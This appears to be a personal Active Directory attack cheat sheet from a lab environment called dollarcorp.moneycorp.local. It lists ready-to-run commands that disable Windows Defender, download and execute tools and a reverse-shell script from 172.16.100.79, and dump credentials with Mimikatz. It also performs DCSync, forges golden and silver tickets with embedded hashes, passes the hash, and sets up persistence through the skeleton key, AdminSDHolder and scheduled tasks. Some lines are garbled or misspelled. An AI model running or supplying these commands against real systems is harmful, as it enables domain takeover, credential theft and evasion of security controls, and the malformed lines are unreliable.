#Powershell Remoting

New-PSSEssion -Computername srv.dcorp.local -Credential student579
Get-PSSession
Enter-PSSession -Id 1

#Find Local Admin Access with current User

Find-LocalAdminAccess
Find-PSRemotingLocalAdminAccess

#Download Files with Powershell

iwr http://172.16.100.79/Loader.exe -OutFile C:\Users\Public\Loader.exe
powershell -c "(new-object System.Net.Webclient).DownloadFile('http://172.16.100.79/nc64.exe', 'C:\Users\Public\nc64.exe')"
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.79/PowerView.ps1'))

#Disable Defender
Set-MpPreference -disableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true

#Remove Defender Definitions
.\MpCmdRun.exe -removedefinitions -all

#Constrained Language Mode Check
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

#Winrs Command
winrs -r:dcorp-dc cmd

#Over Pass the Hash
Get rc4 or aes256 key with Mimikatz
.\Loader.exe -path http://172.16.100.79/SafetyKatz.exe sekurlsa::ekeys exit
Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

#Search for AMSI Triggers in Files
https://github.com/RythmStick/AMSITrigger

#Obfuscate Powershell Files / Commands
https://github.com/danielbohannon/Invoke-Obfuscation

#File Search in AD with current User
Invoke-ShareFinder -Verbose
Invoke-FileFinder -Verbose
Get-NetFileServer

#Find interesting ACL
Find-InterestingDomainAcl -ResolveGUIDs

#Find Active Sessions on Server
Find-DomainUserLocation -Verbose

#Find DomainAdmin Session where the current user has access
Find-DomainUserLocation -CheckAccess

#PowerUp
Invoke-Allchecks
Invoke-Privesc Check
Invoke-Privesc

#Bloodhound
Collect all Infos:
Invoke-BloodHound -CollectionMethod All
.\Sharphound.exe -c All

#DCSync
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

#Golden Ticket
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:e28b3a5c60e087c8489a410a1199235efaf3b9f125972c7a1e7618a7469bfd6a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

#Silver Ticket
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1e16be70054d1c5999aa53994e03e59c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

#Skeleton Attack
Invoke-Mimikatz -Command '"privilege::debug" misc :: ComputerName dcorp-dc.dollarcorp.moneycorp.local
Enter-PSSession -Computername dcorp-dc -credential Dcorp\Administrator
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !
processprotect process:lsass.exe /remove
mimikatz #
misc ::skeleton
mimikatz # !

#Pass the Hash with Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

#Find Service Principal Name with Powerview
Get-DomainUser -SPN

#Find Unconstrained delegation with Powerview
Get-DomainComputer -Unconstrained | select -ExpandProperty

#Example for an exported Kerberos Ticket to get DA Access
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\userX\[0;543c65]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc

#Enum User with constrained delegation with Powerview
Get-DomainUser -TrustedToAuth

#Persisting with AdminSDHOlder
Add-DomainObjectAcl TargetIdentity ' AdminSDHolder,CN System,dc-dollarcorp,dc moneycorp,dc = PrincipalIdentity student1 Rights All PrincipalDomain dollarcorp.moneycorp.local TargetDomain dollarcorp.moneycorp.local Verbose

#Activate RDP with Powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
Get-ItemProperty -Path 'HKLM:\System\CurrecntControlSet\Control\Terminal Server' -name "fDenyTSConnections" 

#Check Applocker Rules
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

#Add Scheduled Task with Silver Ticket
schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcpEx.ps1''')'"







